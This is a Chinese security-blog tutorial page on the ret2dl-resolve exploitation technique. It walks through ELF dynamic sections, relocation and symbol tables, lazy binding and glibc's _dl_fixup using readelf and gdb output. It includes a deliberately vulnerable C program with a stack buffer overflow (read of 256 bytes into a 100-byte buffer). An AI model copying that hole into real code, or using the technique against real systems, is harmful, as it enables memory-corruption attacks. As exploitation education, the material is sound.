<!DOCTYPE html>
<html lang="en">





<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#005f6b">
  <meta name="description" content="Software Security Researcher">
  <meta name="author" content>
  <meta name="keywords" content>
  <title>A trip of ret2dl-resolve - AssassinQ</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">Links</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  Tuesday, August 6th 2019, 4:04 pm
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    5.1k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      29 分钟
                  </span>
                

                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <p>一步步了解 <code>dl-resolve</code> 的利用方法。</p>
<a id="more"></a>
<p>记录一下调 <code>_dl_runtime_resolve</code> 的 Makefile：</p>
<pre><code>all: a
a: a.c
        gcc a.c -o a -Wl, -dynamic-linker /path/to/install/lib/ld-2.23.so -g
</code></pre><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>通过利用 <code>ret2dl-resolve</code> 绕过 NX 和 ASLR 的限制。</p>
<p>例子如下：</p>
<pre><code class="cpp">// gcc -o bof -m32 -fno-stack-protector bof.c
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void vuln() {
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}

int main() {
    char buf[100] = &quot;Return to dl_runtime_resolve!\n&quot;;
    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
</code></pre>
<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>ELF 可执行文件由 ELF 头部，程序头部表和其对应的段，节头部表和其对应的节组成，源码在 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener">elf.h</a> 中实现</p>
<p>一个参与动态链接的可执行文件，它的程序头部表包含类型为 <code>PT_DYNAMIC</code> 的段，<code>PT_DYNAMIC</code> 又包含 <code>.dynamic</code> 节，程序头的结构如下：</p>
<pre><code class="cpp">/* Dynamic section entry.  */
typedef struct
{
  Elf32_Sword        d_tag;                        /* Dynamic entry type */
  union
    {
      Elf32_Word d_val;                        /* Integer value */
      Elf32_Addr d_ptr;                        /* Address value */
    } d_un;
} Elf32_Dyn;
typedef struct
{
  Elf64_Sxword        d_tag;                        /* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;                /* Integer value */
      Elf64_Addr d_ptr;                        /* Address value */
    } d_un;
} Elf64_Dyn;
</code></pre>
<p>执行 <code>readelf -d ./bof</code>，其中 <code>Tag</code> 对应每一个节，比如 <code>JMPREL</code> 对应着 <code>.rel.plt</code>：</p>
<pre><code class="bash">λ readelf -d ./bof

Dynamic section at offset 0xf14 contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x8048358
 0x0000000d (FINI)                       0x8048634
 0x00000019 (INIT_ARRAY)                 0x8049f08
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f0c
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x8048278
 0x00000006 (SYMTAB)                     0x80481d8
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048330
 0x00000011 (REL)                        0x8048318
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482f8
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482e4
 0x00000000 (NULL)                       0x0
</code></pre>
<p>节中包含目标文件的所有信息，节的结构如下：</p>
<pre><code class="cpp">/* Section header.  */
typedef struct
{
  Elf32_Word        sh_name;                /* Section name (string tbl index) */
  Elf32_Word        sh_type;                /* Section type */
  Elf32_Word        sh_flags;                /* Section flags */
  Elf32_Addr        sh_addr;                /* Section virtual addr at execution */
  Elf32_Off        sh_offset;                /* Section file offset */
  Elf32_Word        sh_size;                /* Section size in bytes */
  Elf32_Word        sh_link;                /* Link to another section */
  Elf32_Word        sh_info;                /* Additional section information */
  Elf32_Word        sh_addralign;                /* Section alignment */
  Elf32_Word        sh_entsize;                /* Entry size if section holds table */
} Elf32_Shdr;
typedef struct
{
  Elf64_Word        sh_name;                /* Section name (string tbl index) */
  Elf64_Word        sh_type;                /* Section type */
  Elf64_Xword        sh_flags;                /* Section flags */
  Elf64_Addr        sh_addr;                /* Section virtual addr at execution */
  Elf64_Off        sh_offset;                /* Section file offset */
  Elf64_Xword        sh_size;                /* Section size in bytes */
  Elf64_Word        sh_link;                /* Link to another section */
  Elf64_Word        sh_info;                /* Additional section information */
  Elf64_Xword        sh_addralign;                /* Section alignment */
  Elf64_Xword        sh_entsize;                /* Entry size if section holds table */
} Elf64_Shdr;
</code></pre>
<p>执行 <code>readelf -S ./bof</code>，列出了该 <code>ELF</code> 的 31 个节区：</p>
<pre><code class="bash">λ readelf -S ./bof
There are 31 section headers, starting at offset 0x18a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4
  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4
  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 000242 00  AX  0   0 16
  [15] .fini             PROGBITS        08048634 000634 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048648 000648 000008 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048650 000650 000034 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048684 000684 0000f4 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4
  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4
  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</code></pre>
<p>其中类型为 REL 的节区包含重定位表项，结构如下：</p>
<pre><code class="cpp">/* Relocation table entry without addend (in section of type SHT_REL).  */
typedef struct
{
  Elf32_Addr        r_offset;                /* Address */
  Elf32_Word        r_info;                        /* Relocation type and symbol index */
} Elf32_Rel;
/* I have seen two different definitions of the Elf64_Rel and
   Elf64_Rela structures, so we&#39;ll leave them out until Novell (or
   whoever) gets their act together.  */
/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
} Elf64_Rel;
</code></pre>
<p>执行 <code>readelf -r ./bof</code>，其中 <code>.rel.plt</code> 节用于函数重定位，<code>.rel.dyn</code> 节用于变量重定位：</p>
<pre><code class="bash">λ readelf -r ./bof

Relocation section &#39;.rel.dyn&#39; at offset 0x318 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0
0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0

Relocation section &#39;.rel.plt&#39; at offset 0x330 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
</code></pre>
<p>以 <code>read</code> 为例，<code>read</code> 函数的 <code>r_offset为=0x0804a010</code>，<code>r_info=0x00000207</code></p>
<p><code>.got</code> 节保存全局变量偏移表，<code>.got.plt</code> 节保存全局函数偏移表。<code>.got.plt</code> 对应着 <code>Elf32_Rel</code> 结构中 <code>r_offset</code> 的值</p>
<pre><code class="cpp">/* Symbol table entry.  */
typedef struct
{
  Elf32_Word        st_name;                /* Symbol name (string tbl index) */
  Elf32_Addr        st_value;                /* Symbol value */
  Elf32_Word        st_size;                /* Symbol size */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char        st_other;                /* Symbol visibility */
  Elf32_Section        st_shndx;                /* Section index */
} Elf32_Sym;
typedef struct
{
  Elf64_Word        st_name;                /* Symbol name (string tbl index) */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char st_other;                /* Symbol visibility */
  Elf64_Section        st_shndx;                /* Section index */
  Elf64_Addr        st_value;                /* Symbol value */
  Elf64_Xword        st_size;                /* Symbol size */
} Elf64_Sym;
</code></pre>
<p><code>.dynsym</code> 节包含了动态链接符号表。<code>Elf32_Sym[num]</code> 中的 <code>num</code> 对应着 <code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code></p>
<p>以 <code>read</code> 为例，<code>read</code> 的索引值为 <code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)=ELF32_R_SYM(0x00000207)=0x00000207&gt;&gt;8=2</code>，所以 <code>Elf32_Sym[2]</code> 保存着 <code>read</code> 的符号表信息</p>
<pre><code class="bash">λ readelf -s ./bof

Symbol table &#39;.dynsym&#39; contains 10 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)
     7: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.0 (2)
     8: 0804864c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
     9: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.0 (2)

Symbol table &#39;.symtab&#39; contains 75 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 08048154     0 SECTION LOCAL  DEFAULT    1
     2: 08048168     0 SECTION LOCAL  DEFAULT    2
     3: 08048188     0 SECTION LOCAL  DEFAULT    3
     4: 080481ac     0 SECTION LOCAL  DEFAULT    4
     5: 080481d8     0 SECTION LOCAL  DEFAULT    5
     6: 08048278     0 SECTION LOCAL  DEFAULT    6
     7: 080482e4     0 SECTION LOCAL  DEFAULT    7
     8: 080482f8     0 SECTION LOCAL  DEFAULT    8
     9: 08048318     0 SECTION LOCAL  DEFAULT    9
    10: 08048330     0 SECTION LOCAL  DEFAULT   10
    11: 08048358     0 SECTION LOCAL  DEFAULT   11
    12: 08048380     0 SECTION LOCAL  DEFAULT   12
    13: 080483e0     0 SECTION LOCAL  DEFAULT   13
    14: 080483f0     0 SECTION LOCAL  DEFAULT   14
    15: 08048634     0 SECTION LOCAL  DEFAULT   15
    16: 08048648     0 SECTION LOCAL  DEFAULT   16
    17: 08048650     0 SECTION LOCAL  DEFAULT   17
    18: 08048684     0 SECTION LOCAL  DEFAULT   18
    19: 08049f08     0 SECTION LOCAL  DEFAULT   19
    20: 08049f0c     0 SECTION LOCAL  DEFAULT   20
    21: 08049f10     0 SECTION LOCAL  DEFAULT   21
    22: 08049f14     0 SECTION LOCAL  DEFAULT   22
    23: 08049ffc     0 SECTION LOCAL  DEFAULT   23
    24: 0804a000     0 SECTION LOCAL  DEFAULT   24
    25: 0804a020     0 SECTION LOCAL  DEFAULT   25
    26: 0804a040     0 SECTION LOCAL  DEFAULT   26
    27: 00000000     0 SECTION LOCAL  DEFAULT   27
    28: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    29: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_LIST__
    30: 08048430     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones
    31: 08048460     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones
    32: 080484a0     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux
    33: 0804a048     1 OBJECT  LOCAL  DEFAULT   26 completed.7209
    34: 08049f0c     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtors_aux_fin
    35: 080484c0     0 FUNC    LOCAL  DEFAULT   14 frame_dummy
    36: 08049f08     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_init_array_
    37: 00000000     0 FILE    LOCAL  DEFAULT  ABS bof.c
    38: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    39: 08048774     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__
    40: 08049f10     0 OBJECT  LOCAL  DEFAULT   21 __JCR_END__
    41: 00000000     0 FILE    LOCAL  DEFAULT  ABS
    42: 08049f0c     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end
    43: 08049f14     0 OBJECT  LOCAL  DEFAULT   22 _DYNAMIC
    44: 08049f08     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start
    45: 08048650     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR
    46: 0804a000     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_
    47: 08048630     2 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini
    48: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@@GLIBC_2.0
    49: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@@GLIBC_2.0
    50: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab
    51: 08048420     4 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.bx
    52: 0804a020     0 NOTYPE  WEAK   DEFAULT   25 data_start
    53: 080484eb    52 FUNC    GLOBAL DEFAULT   14 vuln
    54: 0804a028     0 NOTYPE  GLOBAL DEFAULT   25 _edata
    55: 08048634     0 FUNC    GLOBAL DEFAULT   15 _fini
    56: 0804a020     0 NOTYPE  GLOBAL DEFAULT   25 __data_start
    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    58: 0804a024     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle
    59: 0804864c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
    60: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@@GLIBC_2.0
    61: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    62: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@@GLIBC_2.0
    63: 080485d0    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
    64: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@@GLIBC_2.0
    65: 0804a04c     0 NOTYPE  GLOBAL DEFAULT   26 _end
    66: 080483f0     0 FUNC    GLOBAL DEFAULT   14 _start
    67: 08048648     4 OBJECT  GLOBAL DEFAULT   16 _fp_hw
    68: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@@GLIBC_2.0
    69: 0804a028     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
    70: 0804851f   165 FUNC    GLOBAL DEFAULT   14 main
    71: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses
    72: 0804a028     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
    73: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
    74: 08048358     0 FUNC    GLOBAL DEFAULT   11 _init
</code></pre>
<p><code>.dynstr</code> 节包含了动态链接的字符串。这个节以 <code>\x00</code> 作为开始和结尾，中间每个字符串也以 <code>\x00</code> 间隔</p>
<pre><code>assassinq&gt;&gt; x/12s 0x08048278
0x8048278:    &quot;&quot;
0x8048279:    &quot;libc.so.6&quot;
0x8048283:    &quot;_IO_stdin_used&quot;
0x8048292:    &quot;stdin&quot;
0x8048298:    &quot;strlen&quot;
0x804829f:    &quot;read&quot;
0x80482a4:    &quot;stdout&quot;
0x80482ab:    &quot;setbuf&quot;
0x80482b2:    &quot;__libc_start_main&quot;
0x80482c4:    &quot;write&quot;
0x80482ca:    &quot;__gmon_start__&quot;
0x80482d9:    &quot;GLIBC_2.0&quot;
</code></pre><p><code>Elf32_Sym[2]-&gt;st_name=0x27</code>（<code>.dynsym + Elf32_Sym_size * num</code>），所以 <code>.dynstr</code> 加上 <code>0x27</code> 的偏移量，就是字符串 <code>read</code></p>
<pre><code>assassinq&gt;&gt; x/wx 0x080481d8+0x10*2
0x80481f8:    0x00000027
assassinq&gt;&gt; x/s 0x08048278+0x27
0x804829f:    &quot;read&quot;
</code></pre><p><code>.plt</code> 节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置（<code>.plt + Elf32_Sym_size * num</code>）</p>
<pre><code>assassinq&gt;&gt; x/3i 0x08048380+0x10*2
   0x80483a0 &lt;read@plt&gt;:    jmp    DWORD PTR ds:0x804a010
   0x80483a6 &lt;read@plt+6&gt;:    push   0x8
   0x80483ab &lt;read@plt+11&gt;:    jmp    0x8048380
</code></pre><h2 id="Lazy-Binding"><a href="#Lazy-Binding" class="headerlink" title="Lazy Binding"></a>Lazy Binding</h2><p>在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定</p>
<p>当程序执行 <code>call read@plt</code> 时，实际会跳到 <code>0x804a010</code> 去执行。而 <code>0x080483a0</code> 处的汇编代码仅仅三行，第一行中 <code>0x804a010</code> 为 <code>read</code> 的 GOT 表位置，第一次调用 <code>read</code> 时，对应的 GOT 表中并没有放 <code>read</code> 的真实地址，而是 <code>read@plt</code> 的下一条指令地址；</p>
<pre><code>assassinq&gt;&gt; x/wx 0x804a010
0x804a010:    0x080483a6
</code></pre><p>第二行和第三行把 <code>reloc_arg=0x8</code> 作为参数放进栈里，然后跳到 <code>0x8048380</code>（<code>PLT[0]</code>）继续执行；</p>
<pre><code>assassinq&gt;&gt; x/2i 0x080483a6
   0x80483a6 &lt;read@plt+6&gt;:    push   0x8
   0x80483ab &lt;read@plt+11&gt;:    jmp    0x8048380
</code></pre><p>接下来 <code>PLT[0]</code> 再把 <code>link_map=*(GOT+4)</code>（即 <code>GOT[1]</code>，链接器的标识信息）作为参数推入栈中，而 <code>*(GOT+8)</code>（即 <code>GOT[2]</code>，动态链接器中的入口点）中保存的是 <code>_dl_runtime_resolve</code> 函数的地址；</p>
<pre><code>assassinq&gt;&gt; x/2i 0x8048380
   0x8048380:    push   DWORD PTR ds:0x804a004
   0x8048386:    jmp    DWORD PTR ds:0x804a008
</code></pre><p>因此以上指令相当于执行了 <code>_dl_runtime_resolve(link_map, reloc_arg)</code>，该函数会完成符号的解析，即将真实的 <code>read</code> 函数地址写入其 <code>GOT</code> 条目中，随后把控制权交给 <code>read</code> 函数</p>
<pre><code>assassinq&gt;&gt; x/wx 0x804a008
0x804a008:    0xf7fee000
assassinq&gt;&gt; x/11i 0xf7fee000
   0xf7fee000 &lt;_dl_runtime_resolve&gt;:    push   eax
   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;:    push   ecx
   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;:    push   edx
   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;:    mov    edx,DWORD PTR [esp+0x10]
   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;:    mov    eax,DWORD PTR [esp+0xc]
   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;:    call   0xf7fe77e0 &lt;_dl_fixup&gt;
   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;:    pop    edx
   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;:    mov    ecx,DWORD PTR [esp]
   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;:    mov    DWORD PTR [esp],eax
   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;:    mov    eax,DWORD PTR [esp+0x4]
   0xf7fee01b &lt;_dl_runtime_resolve+27&gt;:    ret    0xc
</code></pre><p><code>_dl_fixup</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html" target="_blank" rel="noopener">dl-runtime.c</a> 中实现：</p>
<pre><code class="cpp">_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
  ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
  struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg
  const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目
  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;
  /* Sanity check that we&#39;re really looking at a PLT relocation.  */
// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7
  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);
  /* Look up the target symbol.  If the normal lookup rules are not used don&#39;t look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)
  {
    const struct r_found_version *version = NULL;
    if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)
    {
      const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;
      version = &amp;l-&gt;l_versions[ndx];
      if (version-&gt;hash == 0)
        version = NULL;
    }
    /* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */
    int flags = DL_LOOKUP_ADD_DEPENDENCY;
    if (!RTLD_SINGLE_THREAD_P)
    {
      THREAD_GSCOPE_SET_FLAG ();
      flags |= DL_LOOKUP_GSCOPE_LOCK;
    }
#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif
// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址
    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);
    /* We are done with the global scope.  */
    if (!RTLD_SINGLE_THREAD_P)
      THREAD_GSCOPE_RESET_FLAG ();
#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif
    /* Currently result contains the base load address (or link map) of the object that defines sym.  Now add in the symbol offset.  */
// value为libc基址加上要解析函数的偏移地址，也即实际地址
    value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false));
  }
  else
  {
      /* We already found the symbol.  The module (and therefore its load address) is also known.  */
    value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
    result = l;
  }
  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);
  if (sym != NULL &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;
// 最后把value写入相应的GOT表条目中
  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
</code></pre>
